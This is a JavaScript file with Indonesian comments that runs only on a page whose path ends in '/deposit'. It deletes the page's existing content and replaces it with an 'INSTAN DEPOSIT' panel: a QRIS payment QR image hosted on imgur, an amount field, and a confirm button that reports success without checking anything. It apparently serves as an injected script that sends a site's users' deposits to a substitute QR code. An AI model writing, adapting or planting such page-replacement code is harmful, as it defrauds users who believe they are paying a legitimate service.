document.addEventListener("DOMContentLoaded", function () {
    // Cek apakah URL saat ini berakhiran dengan "/deposit"
    if (!window.location.pathname.endsWith("/deposit")) {
        console.log("Skrip tidak berjalan karena bukan di halaman /deposit");
        return; // Keluar dari skrip jika bukan halaman yang diizinkan
    }

    console.log("Skrip berjalan di halaman /deposit");

    // Membuat elemen `div` utama untuk menampung semua elemen
    let mainWrapper = document.createElement("div");
    mainWrapper.style.display = "flex";
    mainWrapper.style.justifyContent = "center";
    mainWrapper.style.alignItems = "center";
    mainWrapper.style.height = "100vh";
    
    // Membuat container utama
    let container = document.createElement("div");
    container.className = "container";
    container.style.background = "rgba(0, 0, 0, 0.7)";
    container.style.padding = "20px";
    container.style.borderRadius = "10px";
    container.style.textAlign = "center";
    container.style.color = "white";

    container.innerHTML = `
        <h1 style="margin-bottom: 20px;">INSTAN DEPOSIT</h1>
        <img src="https://i.imgur.com/bMwtUcB.jpeg" alt="QRIS Code" style="width: 250px; border-radius: 10px;">
        <br>
        <a href="https://i.imgur.com/bMwtUcB.jpeg" download="qris-code.jpeg" class="btn" 
            style="display: block; margin: 10px auto; padding: 10px 20px; background: #ffcc00; color: black; border: none; border-radius: 5px; cursor: pointer; text-decoration: none;">
            Download QRIS
        </a>
        <p>Scan > Isi Nominal > Transfer > Konfirmasi</p>
        <input type="text" id="nominal" placeholder="Masukkan Nominal" 
            style="width: 80%; padding: 10px; text-align: center; font-size: 18px; border: none; border-radius: 5px; color: brown;">
        <br>
        <button id="konfirmasiBtn" class="btn" 
            style="display: block; margin: 10px auto; padding: 10px 20px; background: #ffcc00; color: black; border: none; border-radius: 5px; cursor: pointer;">
            Konfirmasi
        </button>
    `;

    // Menambahkan elemen ke dalam body
    mainWrapper.appendChild(container);
    document.body.innerHTML = ""; // Hapus elemen sebelumnya agar tidak berantakan
    document.body.appendChild(mainWrapper);

    // Menambahkan background secara langsung ke `body`
    document.body.style.background = "url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQMGf-ZGNtCXgGR1Gcy5rCZxuS-tfdZgyx0tY74IV4ffrptYHsI9-GDC2I&s=10') no-repeat center center fixed";
    document.body.style.backgroundSize = "cover";
    document.body.style.margin = "0";
    document.body.style.padding = "0";
    document.body.style.height = "100vh";

    // Fungsi untuk format nominal otomatis (100000 → 100.000)
    document.getElementById("nominal").addEventListener("input", function (e) {
        let value = e.target.value.replace(/\D/g, ""); 
        e.target.value = value.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
    });

    // Pastikan warna input tetap coklat setelah halaman dimuat
    document.getElementById("nominal").style.color = "brown";

    // Fungsi untuk tombol konfirmasi
    document.getElementById("konfirmasiBtn").addEventListener("click", function () {
        let nominal = document.getElementById("nominal").value;
        if (nominal === "") {
            alert("Masukkan nominal terlebih dahulu!");
        } else {
            alert("Deposit berhasil dikirim");
            window.location.href = "../"; 
        }
    });
});
